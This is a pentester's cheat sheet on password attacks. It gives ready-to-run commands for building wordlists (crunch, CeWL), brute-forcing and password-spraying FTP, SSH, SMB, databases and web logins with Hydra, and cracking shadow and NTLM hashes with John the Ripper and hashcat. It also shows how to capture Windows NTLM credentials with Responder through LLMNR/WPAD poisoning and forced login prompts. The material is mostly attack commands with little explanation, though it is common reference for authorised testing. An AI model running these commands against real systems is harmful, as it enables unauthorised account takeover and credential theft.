# Password Cracking

## Objective

Here are some tips and examples of password cracking and enumeration

## Creating Password Lists

```text
crunch [min] [max] [characters] -t [pattern] -o [FileName]
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha #Only length 4 using charset mixalpha
cewl example.com -m 5 -w words.txt
```

Use CeWL to spider site and create a list of unique words used on the site:

```text
cewl https://mywebsite.com -w /home/cewl_wordlist
```

**Wordlists** [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) [https://github.com/Dormidera/WordList-Compendium](https://github.com/Dormidera/WordList-Compendium) [https://github.com/kaonashi-passwords/Kaonashi](https://github.com/kaonashi-passwords/Kaonashi)

## Hydra

Hydra FTP, MySQL, Postgres, and HTTPS Bruteforce:

```text
hydra -L usernames.txt -P passwords.txt 192.168.2.62 ftp -V -f
hydra -L usernames.txt -P passwords.txt 192.168.2.66 mysql -V -f
hydra -L usernames.txt -P passwords.txt 192.168.2.62 postgres -V
hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”
```

Hydra Telnet , SSH, RTSP, and SNMP Bruteforce:

```text
hydra -L usernames.txt -P passwords.txt 192.168.2.62 telnet -V
hydra -L usernames.txt -P passwords.txt 192.168.2.66 ssh -V
hydra -l root -P passwords.txt <IP> rtsp
hydra -P/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txttarget.com snmp
```

Hydra SMB, SMB w/pass spraying SMTP, and VNC Bruteforce:

```text
hydra -L usernames.txt -P passwords.txt 192.168.2.66 smb -V -f
hydra -L users.txt -p Autumn2016 2.3.4.5 smb
hydra -l <username> -P /path/to/passwords.txt <IP> smtp-V
hydra  -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
```

## John the Ripper

**Run john in Test Mode and against a LANMAN password**

```text
john --test
john LANMAN.txt
```

NTLM Cracking

```text
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

This command fuses the two files together into a single file called "combined":

```text
unshadow /tmp/passwd_copy /tmp/shadow_copy > /tmp/combined
```

Look at JtR Dictionary:

```text
less /opt/JohnTheRipper/run/password.lst
```

Crack Password and show passwords cracked:

```text
john --format=sha512crypt /tmp/combined or john /tmp/combined
john --show mypasswd
```

Cracking Responder Hashes:

```text
john -format=netntlmv2 ./SMB-NTLMv2-SSP-10.10.0.1.txt
```

General Process

John the Ripper:

```text
unshadow passwd shadow > unshadowed.txt
john unshadowed.txt
```

Next, let’s go through the “john.log” file using the grep tool and see how long some of the passwords took to crack:

```text
grep Cracked /root/.john/john.log
```

Let’s see how long it took for John the Ripper to switch between cracking modes:

```text
grep Proceed /root/.john/john.log
```

## Responder

Responder to grab NTLM Creds \(\#-i tell victim systems to connect to this IP address for LLMNR responses\):

```text
cd /opt/Responder
./Responder/py -I eth0 -i 10.10.10.1
```

On Windows machine, type the following in the location bar:

```text
\hellovr
```

Run Responder and Crack Password w/John:

```text
sudo /opt/responder/Responder.py -I eth0
john --format=netntlmv2 /opt/responder/logs/SMBv2-NTLMv2-SSP.txt
```

Specify the IP address to redirect to \(-i 192.168.1.202\), enabling the WPAD rogue proxy \(-w On\), answers for netbios wredir \(-r On\), and fingerprinting \(-f On\):

```text
responder -i 192.168.1.202 -w On -r On -f On

Responder -I eth0 -wbF
“-w” Starts the WPAD Server
“-b” Enables basic HTTP authentication
“-F” Forces authentication for WPAD (a login prompt)
```

